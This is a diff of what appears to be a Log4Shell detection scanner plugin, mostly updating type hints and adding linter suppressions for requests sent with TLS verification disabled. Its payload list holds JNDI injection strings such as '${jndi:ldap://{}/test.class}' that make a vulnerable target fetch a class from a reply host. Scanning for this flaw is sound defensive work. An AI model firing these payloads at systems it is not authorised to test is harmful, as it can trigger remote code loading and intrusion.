@@ -2,7 +2,6 @@ import json
 import logging
 from base64 import b64encode
 from os import getenv
-from typing import Dict, List, Optional, Tuple, Union
 from urllib.parse import urlparse
 
 import requests
@@ -15,7 +14,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 logging.basicConfig(level=logging.INFO)
 
 
-def run(boefje_meta: BoefjeMeta) -> List[Tuple[set, Union[bytes, str]]]:
+def run(boefje_meta: BoefjeMeta) -> list[tuple[set, bytes | str]]:
     input_ = boefje_meta.arguments["input"]
     host = input_["name"]
     identifier = boefje_meta.id
@@ -43,25 +42,25 @@ def run(boefje_meta: BoefjeMeta) -> List[Tuple[set, Union[bytes, str]]]:
     return [(set(), json.dumps(output).encode())]
 
 
-def check_with_header(url_input: str, header_name: str, payload: str, timeout: int) -> Optional[str]:
+def check_with_header(url_input: str, header_name: str, payload: str, timeout: int) -> str | None:
     try:
-        response = requests.get(url_input, headers={header_name: payload}, verify=False, timeout=timeout)
+        response = requests.get(url_input, headers={header_name: payload}, verify=False, timeout=timeout)  # noqa: S501
 
         return b64encode(response.content).decode()
     except requests.exceptions.ConnectionError as e:
         logging.error("HTTP connection to %s URL error: %s", url_input, e)
 
 
-def check(url_input: str, payload: str, timeout: int) -> Optional[str]:
+def check(url_input: str, payload: str, timeout: int) -> str | None:
     try:
-        response = requests.get(f"{url_input}{payload}", verify=False, timeout=timeout)
+        response = requests.get(f"{url_input}{payload}", verify=False, timeout=timeout)  # noqa: S501
 
         return b64encode(response.content).decode()
     except requests.exceptions.ConnectionError as e:
         logging.error("HTTP connection to %s URL error: %s", url_input, e)
 
 
-def get_payloads(url_input: str, reply_host: str, identifier: str) -> Dict[str, str]:
+def get_payloads(url_input: str, reply_host: str, identifier: str) -> dict[str, str]:
     payloads = [
         "${{jndi:ldap://{}/test.class}}",
         "${{jndi:dns://{}:53/test.class}}",
